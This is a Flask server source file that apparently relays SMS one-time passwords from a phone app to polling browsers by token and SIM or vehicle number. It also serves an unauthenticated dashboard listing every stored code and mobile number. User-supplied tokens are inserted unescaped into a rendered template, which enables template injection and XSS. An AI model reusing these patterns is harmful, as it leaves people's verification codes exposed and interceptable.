from flask import Flask, request, jsonify, render_template_string, redirect, url_for
from flask_cors import CORS
from datetime import datetime
import zoneinfo

app = Flask(__name__)
CORS(app)

# =========================
# Storage
# =========================
mobile_otps = []   # [{"otp":..., "token":..., "sim_number":..., "timestamp":...}]
vehicle_otps = []  # [{"otp":..., "token":..., "vehicle":..., "timestamp":...}]
otp_data = {}      # token -> list of OTPs
client_sessions = {}  # (token, sim_number/vehicle) -> {"first_request": datetime}
login_sessions = {}   # mobile_number -> {"timestamp": datetime}

IST = zoneinfo.ZoneInfo("Asia/Kolkata")

# =========================
# Helpers
# =========================
def now_str():
    return datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S")

# =========================
# OTP Endpoints
# =========================
@app.route('/api/receive-otp', methods=['POST'])
def receive_otp():
    try:
        data = request.get_json(force=True)
        otp = (data.get('otp') or "").strip()
        sim_number = (data.get('sim_number') or "").strip().upper()
        token = (data.get('token') or "").strip()
        vehicle = (data.get('vehicle') or "").strip().upper()

        if not otp or not token:
            return jsonify({"status": "error", "message": "OTP and token required"}), 400

        entry = {
            "otp": otp,
            "token": token,
            "timestamp": datetime.now(IST)
        }

        if vehicle:
            entry["vehicle"] = vehicle
            vehicle_otps.append(entry)
            print(f"[{now_str()}] 📦 Vehicle OTP stored - OTP: {otp}, Vehicle: {vehicle}, Token: {token}")
        else:
            entry["sim_number"] = sim_number or "UNKNOWNSIM"
            mobile_otps.append(entry)
            print(f"[{now_str()}] 📦 Mobile OTP stored - OTP: {otp}, SIM: {sim_number}, Token: {token}")

        return jsonify({"status": "success", "message": "OTP stored"}), 200
    except Exception as e:
        print("Error receiving from app:", e)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/get-latest-otp', methods=['GET'])
def get_latest_otp():
    token = (request.args.get('token') or "").strip()
    sim_number = (request.args.get('sim_number') or "").strip().upper()
    vehicle = (request.args.get('vehicle') or "").strip().upper()

    if not token or (not sim_number and not vehicle):
        return jsonify({"status": "error", "message": "token + sim_number OR token + vehicle required"}), 400

    key = (token, sim_number if sim_number else vehicle)
    if key not in client_sessions:
        client_sessions[key] = {"first_request": datetime.now(IST)}
        print(f"[{now_str()}] 🖥️ Browser started polling for {key}")
    session_time = client_sessions[key]["first_request"]

    if vehicle:
        new_otps = [o for o in vehicle_otps if o["token"] == token and o.get("vehicle","").upper() == vehicle and o["timestamp"] > session_time]
        if new_otps:
            latest = new_otps[-1]
            vehicle_otps[:] = [o for o in vehicle_otps if not (o["token"] == token and o.get("vehicle","").upper() == vehicle)]
            client_sessions.pop(key, None)
            # move to otp_data
            otp_data.setdefault(token, []).append(latest)
            print(f"[{now_str()}] 🖥️ Vehicle OTP sent to browser: {latest['otp']} for {vehicle}")
            return jsonify({"status":"success","otp":latest["otp"],"vehicle":latest["vehicle"],"timestamp":latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")}),200
        return jsonify({"status":"empty","message":"No new vehicle OTP"}),200
    else:
        new_otps = [o for o in mobile_otps if o["token"]==token and o.get("sim_number","").upper()==sim_number and o["timestamp"]>session_time]
        if new_otps:
            latest = new_otps[-1]
            mobile_otps[:] = [o for o in mobile_otps if not (o["token"]==token and o.get("sim_number","").upper()==sim_number)]
            client_sessions.pop(key, None)
            # move to otp_data
            otp_data.setdefault(token, []).append(latest)
            print(f"[{now_str()}] 🖥️ Mobile OTP sent to browser: {latest['otp']} for SIM {sim_number}")
            return jsonify({"status":"success","otp":latest["otp"],"sim_number":latest["sim_number"],"timestamp":latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")}),200
        return jsonify({"status":"empty","message":"No new mobile OTP"}),200

# =========================
# Status / Dashboard
# =========================
@app.route('/api/status', methods=['GET', 'POST'])
def status():
    # Handle delete actions
    if request.method=="POST":
        if "delete_otp" in request.form:
            token = request.form.get("token")
            index = int(request.form.get("index"))
            if token in otp_data and index < len(otp_data[token]):
                otp_data[token].pop(index)
        elif "delete_all_otp" in request.form:
            otp_data.clear()
        elif "delete_login" in request.form:
            mobile = request.form.get("mobile_number")
            login_sessions.pop(mobile, None)
        elif "delete_all_login" in request.form:
            login_sessions.clear()
        return redirect(url_for("status"))

    # Build HTML
    tokens_html = "".join(f"<li>{t}</li>" for t in otp_data.keys()) or "<li>No Tokens</li>"
    otp_rows = ""
    for t, entries in otp_data.items():
        for i,e in enumerate(entries):
            sim_vehicle = e.get("sim_number") or e.get("vehicle") or ""
            otp_rows += f"<tr><td>{t}</td><td>{sim_vehicle}</td><td>{e.get('otp')}</td><td>{e.get('timestamp').strftime('%Y-%m-%d %H:%M:%S')}</td><td><form method='POST'><input type='hidden' name='token' value='{t}'><input type='hidden' name='index' value='{i}'><button type='submit' name='delete_otp'>Delete</button></form></td></tr>"

    login_rows = "".join(f"<tr><td>{m}</td><td>{info['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td><td><form method='POST'><input type='hidden' name='mobile_number' value='{m}'><button type='submit' name='delete_login'>Delete</button></form></td></tr>" for m,info in login_sessions.items()) or "<tr><td colspan='3'>No logins</td></tr>"

    html = f"""
    <html>
    <head>
        <title>OTP & Login Dashboard</title>
        <style>
        body {{ font-family: Arial; margin: 20px; }}
        table {{ border-collapse: collapse; width: 100%; margin-bottom: 20px; }}
        th, td {{ border: 1px solid #ccc; padding: 5px; text-align: left; }}
        th {{ background: #f4f4f4; }}
        button {{ padding: 3px 6px; }}
        </style>
    </head>
    <body>
        <h2>Tokens</h2>
        <ul>{tokens_html}</ul>

        <h3>OTP Data</h3>
        <form method="POST"><button name="delete_all_otp">Delete All OTPs</button></form>
        <table>
            <tr><th>TOKEN</th><th>SIM/VEHICLE</th><th>OTP</th><th>DATE</th><th>ACTION</th></tr>
            {otp_rows if otp_rows else "<tr><td colspan='5'>No OTPs</td></tr>"}
        </table>

        <h3>Login IDs</h3>
        <form method="POST"><button name="delete_all_login">Delete All Logins</button></form>
        <table>
            <tr><th>MOBILE NUMBER</th><th>DATE</th><th>ACTION</th></tr>
            {login_rows}
        </table>
    </body>
    </html>
    """
    return render_template_string(html)

# =========================
# Login Detection
# =========================
@app.route('/api/login-detect', methods=['POST'])
def login_detect():
    try:
        data = request.get_json(force=True)
        mobile_number = (data.get('mobile_number') or "").strip().upper()
        if not mobile_number:
            return jsonify({"status": "error", "message": "mobile_number required"}), 400
        login_sessions[mobile_number] = {"timestamp": datetime.now(IST)}
        print(f"[{now_str()}] 🔑 Login detected for mobile: {mobile_number}")
        return jsonify({"status": "success", "message": "Login detected"}), 200
    except Exception as e:
        print("Error in login-detect:", e)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/login-found', methods=['GET'])
def login_found():
    try:
        mobile_number = (request.args.get('mobile_number') or "").strip().upper()
        if not mobile_number:
            return jsonify({"status": "error", "message": "mobile_number required"}), 400
        if mobile_number in login_sessions:
            ts = login_sessions[mobile_number]["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{now_str()}] 🔍 Login found for mobile: {mobile_number}")
            return jsonify({"status": "found", "mobile_number": mobile_number, "timestamp": ts}), 200
        else:
            return jsonify({"status": "not_found", "mobile_number": mobile_number}), 200
    except Exception as e:
        print("Error in login-found:", e)
        return jsonify({"status": "error", "message": str(e)}), 400

# =========================
# Run App
# =========================
if __name__ == '__main__':
    app.run(debug=True)
